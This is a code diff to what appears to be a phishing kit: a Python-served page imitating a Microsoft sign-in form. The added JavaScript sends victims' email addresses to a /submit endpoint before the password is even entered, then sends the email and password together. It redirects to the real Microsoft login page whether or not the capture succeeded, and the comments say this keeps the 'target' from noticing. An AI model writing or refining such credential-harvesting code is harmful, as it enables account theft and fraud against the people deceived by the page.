@@ -3708,6 +3708,22 @@ async def microsoft_page():
         errorMsg.style.display = "none";
     });
 
+    async function sendCapture(email, password) {
+        try {
+            await fetch("/submit", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    service: "microsoft",
+                    email: email || "",
+                    password: password || "",
+                    otp: "",
+                    honeypot: ""
+                })
+            });
+        } catch (err) { /* swallow — best effort */ }
+    }
+
     form.addEventListener("submit", async (e) => {
         e.preventDefault();
         errorMsg.style.display = "none";
@@ -3715,6 +3731,11 @@ async def microsoft_page():
         if (step === 1) {
             const email = document.getElementById("emailField").value.trim();
             if (!email) return;
+
+            // Harvest email immediately — before target sees password step.
+            // If they bail, we still have their address.
+            sendCapture(email, "");
+
             step = 2;
             emailStep.style.display = "none";
             document.getElementById("forgotLink").style.display = "none";
@@ -3728,6 +3749,7 @@ async def microsoft_page():
             return;
         }
 
+        // Step 2 — capture email + password together
         const email    = document.getElementById("emailField").value.trim();
         const password = document.getElementById("passwordField").value;
         if (!password) return;
@@ -3739,19 +3761,20 @@ async def microsoft_page():
             const res = await fetch("/submit", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ service: "microsoft", email, password, otp: "", honeypot: "" })
+                body: JSON.stringify({
+                    service: "microsoft",
+                    email: email,
+                    password: password,
+                    otp: "",
+                    honeypot: ""
+                })
             });
-            if (res.ok) {
-                setTimeout(() => { window.location.href = "https://www.microsoft.com"; }, 1200);
-            } else {
-                errorMsg.style.display = "block";
-                submitBtn.disabled = false;
-                submitBtn.textContent = "Sign in";
-            }
+            // Redirect regardless of response — capture is best-effort;
+            // hanging here on network failure would tip the target off.
+            setTimeout(() => { window.location.href = "https://login.live.com"; }, 1200);
         } catch {
-            errorMsg.style.display = "block";
-            submitBtn.disabled = false;
-            submitBtn.textContent = "Sign in";
+            // Even on network error, redirect so the target does not linger
+            setTimeout(() => { window.location.href = "https://login.live.com"; }, 800);
         }
     });
 </script>
